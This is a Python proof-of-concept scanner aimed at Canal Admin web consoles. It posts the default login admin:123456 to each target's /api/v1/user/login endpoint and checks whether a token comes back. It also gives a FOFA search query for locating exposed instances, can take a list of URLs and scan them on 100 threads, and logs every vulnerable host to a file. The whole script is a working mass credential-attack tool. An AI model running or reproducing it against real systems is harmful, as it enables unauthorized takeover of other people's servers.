#-*- coding: utf-8 -*-
import argparse,sys,requests
requests.packages.urllib3.disable_warnings()
from multiprocessing.dummy import Pool
from rich.console import Console

def banner():
    test = """
 ██████╗ █████╗ ███╗   ██╗ █████╗ ██╗          █████╗ ██████╗ ███╗   ███╗██╗███╗   ██╗
██╔════╝██╔══██╗████╗  ██║██╔══██╗██║         ██╔══██╗██╔══██╗████╗ ████║██║████╗  ██║
██║     ███████║██╔██╗ ██║███████║██║         ███████║██║  ██║██╔████╔██║██║██╔██╗ ██║
██║     ██╔══██║██║╚██╗██║██╔══██║██║         ██╔══██║██║  ██║██║╚██╔╝██║██║██║╚██╗██║
╚██████╗██║  ██║██║ ╚████║██║  ██║███████╗    ██║  ██║██████╔╝██║ ╚═╝ ██║██║██║ ╚████║
 ╚═════╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝    ╚═╝  ╚═╝╚═════╝ ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝
                                         tag: this is a canal admin weak Password poc  
                                                    @version: 1.0.0     @author: jcad                                                                                         
"""
    print(test)

console = Console()

# FOFA: title="Canal Admin"

def poc(target):
    url = target+"/api/v1/user/login"
    headers = {
        "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
        "Content-Type":"application/json;charset=UTF-8"
    }
    json = {
        "username": "admin",
        "password": "123456"
    }
    try:
        res = requests.post(url,headers=headers,verify=False,json=json,timeout=5).text
        if "token" in res:
            console.print(f"[+] {target} is vulnable weak_pass is admin:123456",style="bold green")
            with open("result.txt","a+",encoding="utf-8") as f:
                f.write(target+"\n")
        else:
            console.print(f"[-] {target} is not vulnable",style="bold red")
    except:
        console.print(f"[*] {target} server error",style="bold yellow")
def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak Password')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,"r",encoding="utf8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        mp = Pool(100) # 自己指定的线程数
        mp.map(poc, url_list) #printNumber 函数 target 目标列表
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python3 {sys.argv[0]} -h")

if __name__ == '__main__':
    main()